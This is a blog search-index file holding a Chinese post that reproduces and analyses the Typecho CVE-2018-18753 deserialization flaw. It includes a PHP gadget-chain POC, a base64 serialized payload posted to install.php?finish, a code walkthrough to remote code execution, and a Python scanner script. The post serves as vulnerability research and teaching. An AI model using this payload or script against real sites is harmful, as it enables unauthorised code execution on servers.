<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>New blog</title>
    <url>/2024/10/19/New-blog/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>Typecho反序列漏洞复现和分析(CVE-2018-18753)</title>
    <url>/2024/10/22/Typecho%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="CVE-2018-18753反序列化漏洞"><a href="#CVE-2018-18753反序列化漏洞" class="headerlink" title="CVE-2018-18753反序列化漏洞"></a>CVE-2018-18753反序列化漏洞</h1><p>本地测试环境</p>
<ul>
<li><a href="https://github.com/typecho/typecho/releases/tag/v1.0-14.10.10-release">https://github.com/typecho/typecho/releases/tag/v1.0-14.10.10-release</a></li>
<li>Apache2.4.39</li>
<li>PHP5.4.45</li>
<li>MySQL5.5.29</li>
</ul>
<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>POC(执行<code>phpinfo()</code>)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">	<span class="keyword">const</span> <span class="variable constant_">RSS1</span> = <span class="string">&#x27;RSS 1.0&#x27;</span>; </span><br><span class="line">	<span class="keyword">const</span> <span class="variable constant_">RSS2</span> = <span class="string">&#x27;RSS 2.0&#x27;</span>; </span><br><span class="line">	<span class="keyword">const</span> <span class="variable constant_">ATOM1</span> = <span class="string">&#x27;ATOM 1.0&#x27;</span>; </span><br><span class="line">	<span class="keyword">const</span> <span class="variable constant_">DATE_RFC822</span> = <span class="string">&#x27;r&#x27;</span>; </span><br><span class="line">	<span class="keyword">const</span> <span class="variable constant_">DATE_W3CDTF</span> = <span class="string">&#x27;c&#x27;</span>; </span><br><span class="line">	<span class="keyword">const</span> <span class="variable constant_">EOL</span> = <span class="string">&quot;\n&quot;</span>; </span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$_type</span>; </span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$_items</span>; </span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;_type = <span class="variable language_">$this</span>::<span class="variable constant_">RSS2</span>; </span><br><span class="line">    <span class="variable language_">$this</span>-&gt;_items[<span class="number">0</span>] = <span class="keyword">array</span>( </span><br><span class="line">    	<span class="string">&#x27;title&#x27;</span> =&gt; <span class="string">&#x27;1&#x27;</span>, </span><br><span class="line">    	<span class="string">&#x27;link&#x27;</span> =&gt; <span class="string">&#x27;1&#x27;</span>, </span><br><span class="line">    	<span class="string">&#x27;date&#x27;</span> =&gt; <span class="number">1508895132</span>, </span><br><span class="line">    	<span class="string">&#x27;category&#x27;</span> =&gt; <span class="keyword">array</span>(<span class="keyword">new</span> <span class="title class_">Typecho_Request</span>()), </span><br><span class="line">    	<span class="string">&#x27;author&#x27;</span> =&gt; <span class="keyword">new</span> <span class="title class_">Typecho_Request</span>(), </span><br><span class="line">    	); </span><br><span class="line">  	&#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$_params</span> = <span class="keyword">array</span>(); </span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$_filter</span> = <span class="keyword">array</span>(); </span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">	<span class="variable language_">$this</span>-&gt;_params[<span class="string">&#x27;screenName&#x27;</span>] = <span class="string">&#x27;phpinfo()&#x27;</span>;    </span><br><span class="line">	<span class="variable language_">$this</span>-&gt;_filter[<span class="number">0</span>] = <span class="string">&#x27;assert&#x27;</span>; </span><br><span class="line">	&#125; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="variable">$exp</span> = <span class="keyword">array</span>( </span><br><span class="line">	<span class="string">&#x27;adapter&#x27;</span> =&gt; <span class="keyword">new</span> <span class="title class_">Typecho_Feed</span>(), </span><br><span class="line">	<span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;typecho_&#x27;</span> </span><br><span class="line">); </span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$exp</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /install.php?finish HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:23331</span><br><span class="line"></span><br><span class="line">__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo1OntzOjU6InRpdGxlIjtzOjE6IjEiO3M6NDoibGluayI7czoxOiIxIjtzOjQ6ImRhdGUiO2k6MTUwODg5NTEzMjtzOjg6ImNhdGVnb3J5IjthOjE6e2k6MDtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fXM6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6ODoidHlwZWNob18iO30=</span><br></pre></td></tr></table></figure>

<p><img src="/../img/$%7Bfiilename%7D/image-20241022145855125.png" alt="image-20241022145855125"></p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>全局搜索<code>unserilize()</code>就可以发现一个非常可疑且标准的注入点</p>
<p><code>Typecho_Cookie::get(&#39;__typecho_config&#39;)</code>直接获取我们发过去的<code>Cookie</code>中的<code>__typecho_config</code>参数，实际上它也可以读取POST的东西</p>
<p><img src="/../img/$%7Bfiilename%7D/image-20241022174931008.png" alt="image-20241022174931008"></p>
<p><img src="/../img/$%7Bfiilename%7D/image-20241022150140187.png" alt="image-20241022150140187"></p>
<p>230行，定位后发现触发点在安装程序中</p>
<p><img src="/../img/$%7Bfiilename%7D/image-20241022150623253.png" alt="image-20241022150623253"></p>
<p>59行发现要进安装程序只要使得参数<code>finish</code>存在即可</p>
<p><img src="/../img/$%7Bfiilename%7D/image-20241022150824957.png" alt="image-20241022150824957"></p>
<p>接着寻找可以利用的危险函数并且构造链子，在<code>Request.php</code>的164行发现个危险函数，且很难得的两个参数都是变量，与<code>Request.php</code>对应的类名为<code>Typecho_Request</code></p>
<p><img src="/../img/$%7Bfiilename%7D/image-20241022152037771.png" alt="image-20241022152037771"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_applyFilter</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;_filter) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;_filter <span class="keyword">as</span> <span class="variable">$filter</span>) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="title function_ invoke__">is_array</span>(<span class="variable">$value</span>) ? <span class="title function_ invoke__">array_map</span>(<span class="variable">$filter</span>, <span class="variable">$value</span>) :</span><br><span class="line">            <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$filter</span>, <span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_filter = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果有链子能通到这个函数的话<code>_filter</code>的值可以直接篡改，重要的是如何控制<code>value</code></p>
<p>继续看谁调用了<code>_applyFliter()</code></p>
<p>在<code>Request.php</code>308行，的<code>get</code>()方法中发现有调用<code>_applyFliter()</code>，且传入的<code>value</code>可以通过篡改<code>_params[]</code>的值来控制</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$key</span>, <span class="variable">$default</span> = <span class="literal">NULL</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;_params[<span class="variable">$key</span>]):</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;_params[<span class="variable">$key</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">isset</span>(<span class="built_in">self</span>::<span class="variable">$_httpParams</span>[<span class="variable">$key</span>]):</span><br><span class="line">            <span class="variable">$value</span> = <span class="built_in">self</span>::<span class="variable">$_httpParams</span>[<span class="variable">$key</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable">$default</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$value</span> = !<span class="title function_ invoke__">is_array</span>(<span class="variable">$value</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$value</span>) &gt; <span class="number">0</span> ? <span class="variable">$value</span> : <span class="variable">$default</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_applyFilter</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>对着get()方法写关于Typecho_Request部分的POC</p>
<p>class Typecho_Request<br>{<br>    private $_params &#x3D; array();<br>    private $_filter &#x3D; array();<br>    public function __construct(){<br>    $this-&gt;_params[‘screenName’] &#x3D; ‘phpinfo()’;  &#x2F;&#x2F;sreenName在下文会提到<br>    $this-&gt;_filter[0] &#x3D; ‘assert’;<br>    }<br>} </p>
</blockquote>
<p>接着继续看谁调用了<code>get()</code>方法，发现是<code>Request.php</code>中269行的魔术方法<code>__get()</code>调用了<code>get()</code></p>
<p><img src="/../img/$%7Bfiilename%7D/image-20241022154411565.png" alt="image-20241022154411565"></p>
<p>所以到这里我们要想如何找到一个点，可以实例化<code>Typecho_request</code>，并且访问一个它本身不存在的属性</p>
<blockquote>
<p><code>install.php</code>是包含了<code>common.php</code>的，这个<code>common.php</code>提供了自动加载类的服务，大大拓宽了我们的攻击面</p>
</blockquote>
<blockquote>
<p><img src="/../img/$%7Bfiilename%7D/image-20241022170018156.png" alt="image-20241022170018156"></p>
</blockquote>
<p>我们可以在<code>Feed.php</code>的<code>__toString()</code>方法中可以看到这里<code>item[&#39;author&#39;]</code>访问了一个叫<code>screenName</code>的属性(290行)，检查<code>Typecho_request</code>的类刚好不存在这个属性且item可控，满足条件</p>
<p><img src="/../img/$%7Bfiilename%7D/image-20241022170459015.png" alt="image-20241022170459015"></p>
<p><img src="/../img/$%7Bfiilename%7D/image-20241022170840573.png" alt="image-20241022170840573"><br>特别要注意这里的<code>item</code>是个数组，并且还要传入一些必要参数</p>
<p><img src="/../img/$%7Bfiilename%7D/image-20241022173553399.png" alt="image-20241022173553399"></p>
<blockquote>
<p>据此构造部分POC</p>
<p>class Typecho_Feed<br>{<br>    const RSS1 &#x3D; ‘RSS 1.0’;<br>    const RSS2 &#x3D; ‘RSS 2.0’;<br>    const ATOM1 &#x3D; ‘ATOM 1.0’;<br>    const DATE_RFC822 &#x3D; ‘r’;<br>    const DATE_W3CDTF &#x3D; ‘c’;<br>    const EOL &#x3D; “\n”;<br>    private $_type;<br>    private $_items;<br>    public function __construct(){<br>$this-&gt;_type &#x3D; $this::RSS2;<br>$this-&gt;_items[0] &#x3D; array(<br>    ‘title’ &#x3D;&gt; ‘1’,<br>    ‘link’ &#x3D;&gt; ‘1’,<br>    ‘date’ &#x3D;&gt; 1508895132,<br>    ‘category’ &#x3D;&gt; array(new Typecho_Request()),<br>    ‘author’ &#x3D;&gt; new Typecho_Request(),<br>    );<br>} </p>
<p>} </p>
<p>$exp &#x3D; array(<br>    ‘adapter’ &#x3D;&gt; new Typecho_Feed(),<br>    ‘prefix’ &#x3D;&gt; ‘typecho_’<br>); </p>
</blockquote>
<p>最后就是想如何触发这个<code>__toString()</code>了，在最开始的触发点下面几行，就有我们要找的<code>__toString()</code>触发点</p>
<p><code>install.php</code>的232行，将我们使用反序列化实例化后的对象传入<code>Typecho_Db()</code>中进行变量拼接</p>
<p><img src="/../img/$%7Bfiilename%7D/image-20241022171246135.png" alt="image-20241022171246135"></p>
<p>跟进发现变量拼接，变量拼接进而触发<code>__toString()</code></p>
<p><img src="/../img/$%7Bfiilename%7D/image-20241022171429840.png" alt="image-20241022171429840"></p>
<p>自此完成闭环！传入POC即可RCE</p>
<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>最新版似乎把<code>install.php</code>的代码重构了一遍，连<code>unserialize()</code>函数都找不到了</p>
<p><img src="/../img/$%7Bfiilename%7D/image-20241022175335746.png" alt="image-20241022175335746"></p>
<h2 id="验证脚本"><a href="#验证脚本" class="headerlink" title="验证脚本"></a>验证脚本</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ParseArgs</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;CVE-2018-18753&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-u&quot;</span>, <span class="string">&quot;--url&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;target url to check&quot;</span>, required=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>  __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    args = ParseArgs()</span><br><span class="line">    url = args.url</span><br><span class="line"></span><br><span class="line">    headers = &#123; <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0&#x27;</span>, <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8&#x27;</span>, <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span>, <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate, br, zstd&#x27;</span>, <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>, <span class="string">&#x27;Content-Length&#x27;</span>: <span class="string">&#x27;775&#x27;</span>, <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:23331&#x27;</span>, <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>, <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:23331/install.php?finish&#x27;</span>, <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;PHPSESSID=nmed1gc26genkh1qd7j6kdvdv6; __typecho_lang=zh_CN&#x27;</span>, <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="string">&#x27;document&#x27;</span>, <span class="string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="string">&#x27;navigate&#x27;</span>, <span class="string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="string">&#x27;none&#x27;</span>, <span class="string">&#x27;Sec-Fetch-User&#x27;</span>: <span class="string">&#x27;?1&#x27;</span>, <span class="string">&#x27;Priority&#x27;</span>: <span class="string">&#x27;u=0, i&#x27;</span>, <span class="string">&#x27;Pragma&#x27;</span>: <span class="string">&#x27;no-cache&#x27;</span>, <span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;no-cache&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    params = &#123;<span class="string">&#x27;finish&#x27;</span>: <span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    data = &#123;<span class="string">&#x27;__typecho_config&#x27;</span>: <span class="string">&#x27;YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo1OntzOjU6InRpdGxlIjtzOjE6IjEiO3M6NDoibGluayI7czoxOiIxIjtzOjQ6ImRhdGUiO2k6MTUwODg5NTEzMjtzOjg6ImNhdGVnb3J5IjthOjE6e2k6MDtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fXM6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6ODoidHlwZWNob18iO30=&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    res = requests.post(url=url,headers=headers,data=data,params=params)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&#x27;PHP Version&#x27;</span> <span class="keyword">in</span> res.text):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;存在漏洞&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;不存在漏洞&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>懒得写批量验证了，这洞现在还有我吃</p>
<h2 id="经验"><a href="#经验" class="headerlink" title="经验"></a>经验</h2><p>在复现的同时我一直在思考第一个挖掘人是如何发现这个漏洞的，如果仅仅是看分析，可能你会觉得这个人是不是开透了，这点一个找得比一个准，实际上慢慢自己利用审计工具，phpstorm工具去调试，才发现这其中逻辑的环环紧扣，有正推和逆推的相结合，从一个<code>unserialize()</code>一步步到RCE的过程简直就是艺术</p>
<p>当然也不排除第一个发现这个漏洞的人真的开透了的可能</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>typecho</tag>
      </tags>
  </entry>
</search>
